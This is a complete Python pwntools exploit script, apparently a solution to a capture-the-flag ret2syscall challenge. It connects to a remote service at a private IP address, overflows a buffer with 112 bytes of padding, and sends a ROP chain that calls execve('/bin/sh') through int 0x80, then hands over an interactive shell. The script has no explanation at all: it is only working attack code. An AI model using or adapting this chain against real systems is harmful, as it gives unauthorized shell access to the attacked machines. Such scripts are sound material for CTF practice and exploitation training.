from pwn import *

sh = remote("192.168.18.104",10001)

pop_eax_addr = 0x80bb196
pop_ebcd_addr = 0x806eb90
int_80_addr = 0x8049421
binsh_addr = 0x80be408

payload = 'a' * 112 + p32(pop_eax_addr) + p32(0xb) + p32(pop_ebcd_addr) + p32(0) + p32(0) + p32(binsh_addr) + p32(int_80_addr)

sh.recvuntil("What do you plan to do?")

sh.sendline(payload)

sh.interactive()